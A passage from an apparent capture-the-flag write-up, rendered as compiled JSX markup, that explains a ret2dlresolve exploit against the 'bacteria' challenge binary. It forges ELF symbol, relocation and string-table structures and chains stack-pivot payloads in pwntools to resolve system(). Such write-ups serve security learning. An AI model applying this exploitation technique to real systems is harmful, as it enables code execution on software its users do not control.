bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"unsigned\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"char\"}),\" st_other\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"   \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* No defined meaning, 0 (1 bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Elf64_Half st_shndx\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"      \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* Associated section index (2 bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Elf64_Addr st_value\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"      \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* Value of the symbol (8 bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Elf64_Xword st_size\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"      \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* Associated symbol size (8 bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),\" Elf64_Sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"The variable we want to fake here is st_name and we just keep the others same as Elf64_Sym of read:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/read_fake_keep.png\",alt:\"read_fake_keep.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"But because our space is limited so we cannot write the struct in 0x10 bytes, the other 0x10 bytes will be use to control the flow. So our Elf64_Sym_Struct would be like this:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p32\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xdeadbeef\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"        \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Unknown, temporary\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p8\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x12\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_other \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p8\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_shndx \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p16\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_value \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# st_size is null already because the stack now contain all null byte\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# so we don\\u2019t need to write these variable, just need to pad full 0x10\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# bytes so that we don\\u2019t need to sleep()\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Sym_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_other \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),` st_shndx\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Because we haven\\u2019t build up structure for STRTAB so st_name will be \",(0,e.jsx)(n.code,{children:\"0xdeadbeef\"}),\", just temporary and will change when STRTAB is finished. Now we will leave it here and continue with the second struct: Elf64_Rela!\"]}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-3-fake-address-and-structure-of-elf64_rela\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-3-fake-address-and-structure-of-elf64_rela\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 3: Fake address and structure of Elf64_Rela\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"First, we will need the address for Elf64_Rela struct to make \",(0,e.jsx)(n.code,{children:\"reloc_arg\"}),\" is an integer with the following calculation:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`    <Address of Elf64_Rela> = <JMPREL> + <reloc_arg> * 24\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`<=> <reloc_arg> = ( <Address of Elf64_Rela> - <JMPREL> ) / 24\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"After a while trying various address, the address of Elf64_Rela will be \",(0,e.jsx)(n.code,{children:\"rw_section + 0x40\"}),\" and we have the following stuffs:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`JMPREL = 0x400300\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Elf64_Rela_addr  = rw_section + 0x40                      = 0x403e40\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`reloc_arg        = int(( Elf64_Rela_addr - JMPREL) / 24)  = 632\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Now we will create the structure for Elf64_Rela which is defined as follows:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-c\",children:(0,e.jsxs)(n.code,{className:\"language-c code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"typedef\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,e.jsx)(n.span,{className:\"token class-name\",children:\"elf64_rela\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Elf64_Addr r_offset\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"      \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* Location at which to apply the action (8 bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Elf64_Xword r_info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"       \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* index and type of relocation (8 bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Elf64_Sxword r_addend\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* Constant addend used to compute value (8 bytes) */\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),\" Elf64_Rela\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"We will fake r_offset and r_info while r_addend is the same with .rela.plt of read, which is null byte:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/read_JMPREL_GDB.png\",alt:\"read_JMPREL_GDB.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"So our struct for Elf64_Rela will be as following:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"r_offset \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xdeadbeef\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Unknown, temporary\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"r_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"symbol_number \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<<\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x7\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# r_addend is null and stack is null already so we don\\u2019t need to write this,\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# also because we run out of 0x10 bytes we can write\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Rela_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" r_offset \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),` r_info\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"We know that r_offset is the place which contains the resolved libc address so we will chose the address for that later. Now we will move to the last thing we need to fake: STRTAB.\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-4-fake-address-and-structure-of-strtab\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-4-fake-address-and-structure-of-strtab\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 4. Fake address and structure of STRTAB\"]}),`\n`,(0,e.jsx)(n.p,{children:\"As 2 part above does at the begining, we will choose the address for STRTAB first. This address also have to satisfy this calculation:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`    <Address for STRTAB> = <STRTAB> + <st_name>\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`<=> <st_name> = <Address for STRTAB> - <STRTAB>\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"So this is easier because we don\\u2019t have a division in the calculation. So we will choose any address which doesn\\u2019t overwrite the other data:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`STRTAB_addr  = rw_section + 0x80     = 0x403e80\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`st_name      = STRTAB_addr - STRTAB  = 15296\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And the struct for STRTAB is just simply a string contain the function we want:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'system\\\\x00\\\\x00'\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"              \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Just for padding so we don\\u2019t need to sleep() when read\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"From here, we have 2 things we haven\\u2019t done is st_name of Elf64_Sym and r_offset of Elf64_Rela. For st_name, we can get that from STRTAB above so stage 2 will change like this:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"SYMTAB \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400290\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Sym_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),` rw_section\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"symbol_number  \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"int\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Elf64_Sym_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" SYMTAB\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"24\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p32\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"15296\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"        \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change here\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p8\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x12\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_other \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p8\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_shndx \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p16\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_value \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# st_size is null already because the stack now contain all null byte\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# so we don\\u2019t need to write these variable, just need to pad full 0x10\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# bytes so that we don\\u2019t need to sleep()\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Sym_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_other \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" st_shndx \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),` st_value\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"And for r_offset, we just leave it as \",(0,e.jsx)(n.code,{children:\"0xdeadbeef\"}),\" and will change that after checking the stack. So now we just move to the next stage to know if our struct are in the correct position or not.\"]}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-5-conduct-ret2dlresolve--leak-libc-address\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-5-conduct-ret2dlresolve--leak-libc-address\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 5. Conduct ret2dlresolve & Leak libc address\"]}),`\n`,(0,e.jsx)(n.p,{children:\"We have the address for each struct so now just write stuff to stack. Remember where we stopped was at the stage 1 with the following code:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x403e00\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"mov_rsi_rbp_read \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x401027\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"           \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# rip\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\"                   \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Just for padding so that we don\\u2019t need to sleep()\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"So we will need to change the place we stack pivot because we want to write Elf64_Sym at the same time we stack pivot so our first stage will change a bit at the fake rbp:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x403e00\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"mov_rsi_rbp_read \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x401027\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# rip\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\"                   \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Just for padding so that we don\\u2019t need to sleep()\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Because we want the Elf64_Sym structure is placed at the correct address so we subtract with 0x10 so that in the next input, we will write the first 0x10 of fake rbp and rip, then the next 0x10 is the Elf64_Sym in the correct address. And when it read for the second time, which means it\\u2019s reading to the address of rw_section - 0x10. So we will write the ELf64_Sym struct to here with following code:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Write Elf64_Sym structure\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Elf64_Rela_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, write and jump to Elf64_Rela address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` Elf64_Sym_struct\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"And with the next input, it will read to the address of \",(0,e.jsx)(n.code,{children:\"Elf64_Rela_addr - 0x10\"}),\" so we will write the Elf64_Rela structure with the following code:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Write Elf64_Rela structure\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"STRTAB_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"        \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, write and jump to STRTAB address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` Elf64_Rela_struct\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And with the next read(), it will write to the STRTAB address so we have the following code:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Write STRTAB structure\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"                         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Check first, change later\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` STRTAB_struct\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"We will get the reloc_arg to check if all the structures are set properly or not:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsx)(n.code,{className:\"language-python code-highlight\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token 